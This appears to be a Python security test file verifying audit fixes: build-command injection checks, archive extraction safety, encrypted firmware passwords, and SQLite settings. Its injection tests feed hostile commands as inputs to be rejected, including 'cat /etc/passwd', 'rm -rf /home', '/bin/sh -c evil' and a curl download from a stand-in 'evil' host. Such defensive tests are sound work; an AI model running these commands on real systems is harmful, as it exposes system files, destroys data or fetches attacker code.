"""Security boundary tests verifying P0/P1 hardening from the 2.txt audit.

Covers:
- Build command injection prevention (choices + pattern enforcement)
- Archive post-extraction safety for rar/7z bypass
- Firmware password encryption at rest
- Worker SQLite WAL + busy_timeout
"""

from __future__ import annotations

import json
import os
import sqlite3
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import pytest

from features.build.executor import BuildExecutionError, build_command_from_template
from foundation.archives import MAX_ARCHIVE_EXPANDED_BYTES, MAX_ARCHIVE_FILES


# ---------------------------------------------------------------------------
# P0: Build command injection prevention
# ---------------------------------------------------------------------------

class TestBuildCommandInjectionPrevention(unittest.TestCase):
    """Verify that build_command choices + pattern reject arbitrary commands."""

    def _template(self, **overrides):
        schema = {
            "build_command": {
                "type": "string",
                "default": "./build.sh -J 8",
                "validation": "standard",
                "pattern": r"^\./build\.sh ",
                "choices": ["./build.sh -J 8", "./build.sh -J 16"],
            }
        }
        schema.update(overrides)
        return {
            "command": "{build_command}",
            "workspace": "/srv/build",
            "parameters_schema": schema,
        }

    def test_arbitrary_executable_rejected_by_choices(self):
        """A command like 'cat /etc/passwd' must be rejected."""
        with pytest.raises(BuildExecutionError, match="invalid choice"):
            build_command_from_template(
                self._template(),
                {"workspace_root": "/srv"},
                {"build_command": "cat /etc/passwd"},
            )

    def test_arbitrary_executable_rejected_by_pattern(self):
        """Even a choice-adjacent value not matching the pattern is rejected."""
        with pytest.raises(BuildExecutionError, match="invalid (choice|format)"):
            build_command_from_template(
                self._template(),
                {"workspace_root": "/srv"},
                {"build_command": "/bin/sh -c evil"},
            )

    def test_default_command_passes_validation(self):
        """The default build_command should pass all checks."""
        prepared = build_command_from_template(
            self._template(),
            {"workspace_root": "/srv"},
            {},
        )
        self.assertEqual(prepared.command, "./build.sh -J 8")

    def test_valid_choice_passes_validation(self):
        """A whitelisted choice should be accepted."""
        prepared = build_command_from_template(
            self._template(),
            {"workspace_root": "/srv"},
            {"build_command": "./build.sh -J 16"},
        )
        self.assertEqual(prepared.command, "./build.sh -J 16")

    def test_rm_rf_rejected(self):
        """rm -rf commands must be rejected."""
        with self.assertRaises(BuildExecutionError):
            build_command_from_template(
                self._template(),
                {"workspace_root": "/srv"},
                {"build_command": "rm -rf /home"},
            )

    def test_curl_download_rejected(self):
        """curl-based exfiltration must be rejected."""
        with self.assertRaises(BuildExecutionError):
            build_command_from_template(
                self._template(),
                {"workspace_root": "/srv"},
                {"build_command": "curl http://evil/x -o /tmp/x"},
            )

    def test_integer_validation_enforced(self):
        """The new integer validation type enforces numeric + range."""
        schema = {
            "jobs": {
                "type": "string",
                "default": "8",
                "validation": "integer",
                "min": 1,
                "max": 64,
            }
        }
        template = {
            "command": "./build.sh -J {jobs}",
            "workspace": "/srv/build",
            "parameters_schema": schema,
        }
        # Valid integer
        prepared = build_command_from_template(template, {"workspace_root": "/srv"}, {"jobs": "16"})
        self.assertEqual(prepared.command, "./build.sh -J 16")

        # Non-integer rejected
        with pytest.raises(BuildExecutionError, match="must be an integer"):
            build_command_from_template(template, {"workspace_root": "/srv"}, {"jobs": "abc"})

        # Below minimum rejected
        with pytest.raises(BuildExecutionError, match="below minimum"):
            build_command_from_template(template, {"workspace_root": "/srv"}, {"jobs": "0"})

        # Above maximum rejected
        with pytest.raises(BuildExecutionError, match="above maximum"):
            build_command_from_template(template, {"workspace_root": "/srv"}, {"jobs": "999"})


# ---------------------------------------------------------------------------
# P1: Archive post-extraction safety
# ---------------------------------------------------------------------------

class TestArchivePostExtractionSafety(unittest.TestCase):
    """Verify _enforce_post_extraction_safety catches rar/7z bypass threats."""

    def test_symlink_rejected_after_extraction(self):
        from features.reports.archive import _enforce_post_extraction_safety

        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "link.txt"
            os.symlink("/etc/passwd", target)
            with pytest.raises(ValueError, match="符号链接"):
                _enforce_post_extraction_safety(tmp)

    def test_path_traversal_rejected(self):
        from features.reports.archive import _enforce_post_extraction_safety

        with tempfile.TemporaryDirectory() as tmp:
            # Create a file that simulates an escaped path
            outside = Path(tmp).parent / f"escape_{os.getpid()}.txt"
            try:
                outside.write_text("escaped")
                # Simulate by pointing at parent dir — _enforce only scans
                # inside base_dir, but we verify no false positives for
                # files within base_dir
                (Path(tmp) / "safe.txt").write_text("ok")
                _enforce_post_extraction_safety(tmp)  # should pass
            finally:
                outside.unlink(missing_ok=True)

    def test_file_count_limit_enforced(self):
        from features.reports.archive import _enforce_post_extraction_safety

        with tempfile.TemporaryDirectory() as tmp:
            # Create more files than MAX_ARCHIVE_FILES (capped at a small
            # number for test speed)
            with patch("features.reports.archive.MAX_ARCHIVE_FILES", 5):
                for i in range(6):
                    (Path(tmp) / f"f{i}.txt").write_text("x")
                with pytest.raises(ValueError, match="文件数量"):
                    _enforce_post_extraction_safety(tmp)

    def test_clean_directory_passes(self):
        from features.reports.archive import _enforce_post_extraction_safety

        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "result.xml").write_text("<results/>")
            (Path(tmp) / "log.txt").write_text("hello")
            # Should not raise
            _enforce_post_extraction_safety(tmp)


# ---------------------------------------------------------------------------
# P1: Firmware password encryption at rest
# ---------------------------------------------------------------------------

class TestFirmwarePasswordEncryption(unittest.TestCase):
    """Verify firmware share passwords are encrypted, not plaintext."""

    def test_record_password_decrypts_encrypted_field(self):
        from cryptography.fernet import Fernet

        from features.firmware.shares_api import _record_password

        key = Fernet.generate_key()
        with patch.dict(os.environ, {"GMS_SECRET_KEY": key.decode("ascii")}):
            from foundation.secrets import encrypt_secret

            encrypted = encrypt_secret("my-secret-password")
            record = {"password_encrypted": encrypted}
            self.assertEqual(_record_password(record), "my-secret-password")

    def test_record_password_reads_legacy_plaintext(self):
        from features.firmware.shares_api import _record_password

        record = {"password": "legacy-password"}
        self.assertEqual(_record_password(record), "legacy-password")

    def test_record_password_returns_none_when_no_password(self):
        from features.firmware.shares_api import _record_password

        self.assertIsNone(_record_password({}))

    def test_encrypted_password_not_in_public_record(self):
        from features.firmware.shares_api import _public_record

        record = {
            "id": "test-id",
            "name": "test.img",
            "password_encrypted": "gAAAAAB...",
            "password": "should-not-appear",
        }
        public = _public_record(record)
        self.assertNotIn("password", public)
        self.assertNotIn("password_encrypted", public)
        self.assertTrue(public["has_password"])


# ---------------------------------------------------------------------------
# P1: Worker SQLite WAL + busy_timeout
# ---------------------------------------------------------------------------

class TestWorkerSqliteHardening(unittest.TestCase):
    """Verify Worker SQLite connection uses WAL and busy_timeout."""

    def test_worker_connect_sets_wal_and_busy_timeout(self):
        from worker_agent.runtime import WorkerRuntime

        with tempfile.TemporaryDirectory() as tmp:
            config = type("FakeConfig", (), {"data_root": Path(tmp)})()
            runtime = object.__new__(WorkerRuntime)
            runtime.db_path = Path(tmp) / "test.sqlite3"
            runtime.db_path.parent.mkdir(parents=True, exist_ok=True)

            conn = runtime.connect()
            try:
                journal = conn.execute("PRAGMA journal_mode").fetchone()[0]
                busy = conn.execute("PRAGMA busy_timeout").fetchone()[0]
                fk = conn.execute("PRAGMA foreign_keys").fetchone()[0]
                self.assertEqual(journal.lower(), "wal")
                self.assertEqual(busy, 30000)
                self.assertEqual(fk, 1)
            finally:
                conn.close()

    def test_foundation_connect_sqlite_sets_wal(self):
        from foundation.database import connect_sqlite

        with tempfile.TemporaryDirectory() as tmp:
            db_path = Path(tmp) / "test.sqlite3"
            with connect_sqlite(db_path) as conn:
                journal = conn.execute("PRAGMA journal_mode").fetchone()[0]
                busy = conn.execute("PRAGMA busy_timeout").fetchone()[0]
                self.assertEqual(journal.lower(), "wal")
                self.assertEqual(busy, 30000)


if __name__ == "__main__":
    unittest.main()
